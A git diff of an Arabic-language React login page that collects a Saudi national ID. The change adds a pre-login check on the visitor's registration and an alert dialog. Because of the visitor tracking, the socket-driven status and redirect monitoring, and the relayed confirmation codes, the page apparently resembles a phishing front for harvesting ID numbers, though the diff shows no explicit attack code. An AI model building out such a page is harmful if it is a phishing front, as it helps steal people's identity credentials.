@@ -10,8 +10,18 @@ import {
   DialogHeader,
   DialogTitle,
 } from "@/components/ui/dialog";
+import {
+  AlertDialog,
+  AlertDialogAction,
+  AlertDialogCancel,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogFooter,
+  AlertDialogHeader,
+  AlertDialogTitle,
+} from "@/components/ui/alert-dialog";
 import { useEffect, useState } from "react";
-import { submitVisitorFormData } from "@/lib/api";
+import { submitVisitorFormData, checkVisitorRegistration } from "@/lib/api";
 import { Alert } from "@/components/ui/alert";
 import { onVisitorStatusUpdated } from "@/lib/socket";
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
@@ -20,6 +30,9 @@ import { updateVisitorPage } from "@/lib/visitor-tracking";
 export default function Component() {
   const [showConfirmDialog, setShowConfirmDialog] = useState(false);
   const [showSuccessDialog, setShowSuccessDialog] = useState(false);
+  const [showRegistrationAlert, setShowRegistrationAlert] = useState(false);
+  const [registrationMessage, setRegistrationMessage] = useState("");
+  const [isCheckingRegistration, setIsCheckingRegistration] = useState(false);
   const [confirmationCode, setConfirmationCode] = useState<string>("");
   const [isloading, setIsLoading] = useState(false);
   const [idLogin, setLoginID] = useState("");
@@ -169,10 +182,37 @@ export default function Component() {
     const visitorId = localStorage.getItem("visitor");
     setShowError("");
 
+    if (!visitorId) {
+      setRegistrationMessage("لم يتم العثور على معرف الزائر. يرجى بدء التسجيل من جديد.");
+      setShowRegistrationAlert(true);
+      return;
+    }
+
     // Validate ID before submitting
     if (!validateSaudiId(idLogin)) {
       return
     }
+
+    // Check if visitor is registered
+    setIsCheckingRegistration(true);
+    try {
+      const checkResult = await checkVisitorRegistration(visitorId);
+      console.log('[handleLogin] Registration check:', checkResult);
+      
+      if (!checkResult.isRegistered) {
+        setRegistrationMessage(checkResult.message || "لا يوجد لديك سجل. يرجى إعادة التسجيل.");
+        setShowRegistrationAlert(true);
+        setIsCheckingRegistration(false);
+        return;
+      }
+    } catch (error) {
+      console.error('[handleLogin] Registration check failed:', error);
+      setRegistrationMessage("فشل في التحقق من التسجيل. يرجى المحاولة مرة أخرى.");
+      setShowRegistrationAlert(true);
+      setIsCheckingRegistration(false);
+      return;
+    }
+    setIsCheckingRegistration(false);
 
     setIsLoading(true);
     setConfirmationCode(""); // Clear previous code to show loading state
@@ -309,10 +349,15 @@ export default function Component() {
 
               <Button
                 type="submit"
-                disabled={isloading || !idLogin}
+                disabled={isloading || !idLogin || isCheckingRegistration}
                 className="w-full bg-gradient-to-r from-teal-600 to-teal-700 hover:from-teal-700 hover:to-teal-800 text-white h-12 text-lg font-semibold shadow-md hover:shadow-lg transition-all disabled:opacity-50"
               >
-                {isloading ? (
+                {isCheckingRegistration ? (
+                  <>
+                    <Loader2Icon className="animate-spin ml-2" />
+                    جاري التحقق...
+                  </>
+                ) : isloading ? (
                   <>
                     <Loader2Icon className="animate-spin ml-2" />
                     جاري التحقق...
@@ -437,6 +482,35 @@ export default function Component() {
             </div>
           </DialogContent>
         </Dialog>
+
+        {/* Registration Alert Dialog */}
+        <AlertDialog open={showRegistrationAlert} onOpenChange={setShowRegistrationAlert}>
+          <AlertDialogContent className="max-w-md">
+            <AlertDialogHeader>
+              <AlertDialogTitle className="text-right text-xl">⚠️ تنبيه</AlertDialogTitle>
+              <AlertDialogDescription className="text-right text-base">
+                {registrationMessage || "لا يوجد لديك سجل. يرجى إعادة التسجيل."}
+              </AlertDialogDescription>
+            </AlertDialogHeader>
+            <AlertDialogFooter className="flex-row-reverse gap-2">
+              <AlertDialogCancel className="bg-gray-100 hover:bg-gray-200 text-gray-800">
+                إلغاء
+              </AlertDialogCancel>
+              <AlertDialogAction 
+                className="bg-[#1a5c85] hover:bg-[#154a6d] text-white"
+                onClick={() => {
+                  setShowRegistrationAlert(false);
+                  if (typeof window !== 'undefined') {
+                    localStorage.removeItem('visitor');
+                  }
+                  window.location.href = '/home-new';
+                }}
+              >
+                تسجيل جديد
+              </AlertDialogAction>
+            </AlertDialogFooter>
+          </AlertDialogContent>
+        </AlertDialog>
       </main>
 
       {/* Footer */}
